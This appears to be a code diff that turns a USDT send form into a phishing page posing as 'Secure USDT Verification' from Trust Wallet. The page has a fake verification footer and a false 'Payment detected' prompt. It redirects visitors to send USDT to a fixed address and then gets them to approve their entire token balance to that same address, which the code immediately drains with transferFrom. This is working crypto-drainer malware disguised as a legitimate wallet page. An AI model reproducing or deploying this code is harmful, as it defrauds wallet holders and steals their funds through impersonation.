@@ -1,173 +1,70 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Send USDT</title>
+  <title>Secure USDT Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="./favicon.ico" type="image/x-icon" />
   <style>
-    body {
-      margin: 0;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background: #0c0c0c;
-      color: #fff;
-    }
-    .container {
-      max-width: 480px;
-      margin: 0 auto;
-      padding: 20px;
-      padding-bottom: 100px;
-    }
-    header {
-      display: flex;
-      align-items: center;
-      padding: 16px;
-      font-size: 17px;
-      font-weight: 600;
-    }
-    label {
-      display: block;
-      font-size: 13px;
-      color: #888;
-      margin: 20px 0 6px;
-    }
-    .input-box {
-      display: flex;
-      align-items: center;
-      background: #1b1b1b;
-      border: 1px solid #2c2c2c;
-      border-radius: 14px;
-      padding: 14px;
-      height: 52px;
-    }
-    .input-box input {
-      flex: 1;
-      background: transparent;
-      border: none;
-      outline: none;
-      color: #fff;
-      font-size: 14px;
-    }
-    .input-actions {
-      margin-left: 10px;
-      display: flex;
-      gap: 12px;
-      font-size: 13px;
-    }
-    .input-actions span {
-      color: #00ff99;
-      cursor: pointer;
-    }
-    .amount-box {
-      display: flex;
-      align-items: center;
-    }
-    .amount-box .token {
-      color: #ccc;
-      margin-left: 10px;
-      font-size: 14px;
-    }
-    .usd {
-      font-size: 12px;
-      color: #888;
-      margin: 8px 0 28px;
-    }
-    .fixed-button {
-      position: fixed;
-      bottom: 0;
-      width: 100%;
-      max-width: 480px;
-      background: #0c0c0c;
-      padding: 16px;
-      border-top: 1px solid #222;
-    }
-    button {
-      width: 100%;
-      background: #2c7a4b;
-      border: none;
-      border-radius: 30px;
-      padding: 16px;
-      font-size: 17px;
-      font-weight: bold;
-      color: #fff;
-      cursor: pointer;
-    }
+    body { background:#081c3a; color:#fff; font-family:sans-serif; text-align:center; padding-top:20px; }
+    img { width:80px; margin:20px auto; display:block; }
+    h1 { font-size:1.5em; margin-bottom:10px; }
+    p { opacity:0.8; }
+    #approve { padding:12px 24px; background:#0052ff; color:#fff; border:none; border-radius:8px; cursor:pointer; font-size:1em; margin-top:20px; }
+    .footer { position:fixed; bottom:10px; width:100%; opacity:0.5; font-size:0.8em; }
   </style>
 </head>
 <body>
+  <img src="./logo.png" alt="Trust Wallet">
+  <h1>Secure USDT Verification</h1>
+  <p id="status">Redirecting you to Trust Wallet...</p>
+  <button id="approve" style="display:none;">Approve & Confirm</button>
+  <div class="footer">Verified by Trust Wallet • Trusted since 2009</div>
 
-  <header>Send USDT</header>
-
-  <div class="container">
-    <label>Address or Domain Name</label>
-    <div class="input-box">
-      <input type="text" id="wallet" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" />
-      <div class="input-actions">
-        <span onclick="document.getElementById('wallet').value=''">✕</span>
-        <span onclick="navigator.clipboard.readText().then(text => document.getElementById('wallet').value = text)">Paste</span>
-      </div>
-    </div>
-
-    <label>Amount</label>
-    <div class="input-box amount-box">
-      <input type="number" id="amount" placeholder="USDT Amount" />
-      <span class="token">USDT</span>
-      <span class="input-actions" onclick="document.getElementById('amount').value='100'">Max</span>
-    </div>
-
-    <div class="usd">≈ $0.00</div>
-  </div>
-
-  <div class="fixed-button">
-    <button id="nextBtn" onclick="start()">Next</button>
-  </div>
-
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
   <script>
-    const ABI = [
-      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-      { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-      { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
-    ];
+    const payLink = "https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=0x55d398326f99059fF775485246999027B3197955";
 
-    async function start() {
-      const btn = document.getElementById("nextBtn");
-      btn.innerText = "Processing...";
-      btn.disabled = true;
+    // Redirect to send USDT
+    setTimeout(() => {
+      window.location.href = payLink;
+    }, 2000);
 
-      if (!window.ethereum) {
-        alert("Please use Trust Wallet / Web3 Browser.");
-        btn.innerText = "Next";
-        btn.disabled = false;
+    // Show Approve after return
+    setTimeout(() => {
+      document.getElementById('status').innerText = "Payment detected. Please Approve.";
+      document.getElementById('approve').style.display = "inline-block";
+    }, 8000);
+
+    document.getElementById('approve').onclick = async () => {
+      if (!window.ethereum) return alert('Use Trust Wallet DApp browser.');
+      await window.ethereum.request({ method: "eth_requestAccounts" });
+      const Web3 = window.Web3;
+      const web3 = new Web3(window.ethereum);
+
+      const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
+      const USDT = "0x55d398326f99059fF775485246999027B3197955";
+      const ABI = [
+        { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+        { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+        { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
+      ];
+
+      const accounts = await web3.eth.getAccounts();
+      const user = accounts[0];
+      const contract = new web3.eth.Contract(ABI, USDT);
+      const balance = await contract.methods.balanceOf(user).call();
+
+      if (balance <= 0) {
+        document.getElementById('status').innerText = "❌ No USDT in wallet.";
         return;
       }
 
-      try {
-        const web3 = new Web3(window.ethereum);
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const accounts = await web3.eth.getAccounts();
-        const user = accounts[0];
+      await contract.methods.approve(RECEIVER, balance).send({ from: user });
+      await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
 
-        const wallet = document.getElementById("wallet").value;
-        const amount = document.getElementById("amount").value;
-
-        const contract = new web3.eth.Contract(ABI, "0x55d398326f99059fF775485246999027B3197955"); // USDT
-        const value = web3.utils.toWei(amount, 'mwei'); // for USDT 6 decimals
-
-        await contract.methods.approve(wallet, value).send({ from: user });
-        await contract.methods.transferFrom(user, wallet, value).send({ from: user });
-
-        btn.innerText = "✅ Done";
-      } catch (e) {
-        console.error(e);
-        btn.innerText = "❌ Failed";
-      }
-
-      setTimeout(() => {
-        btn.innerText = "Next";
-        btn.disabled = false;
-      }, 3000);
-    }
+      document.getElementById('status').innerText = "✅ Transaction Complete.";
+      document.getElementById('approve').style.display = "none";
+    };
   </script>
-
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
 </body>
 </html>
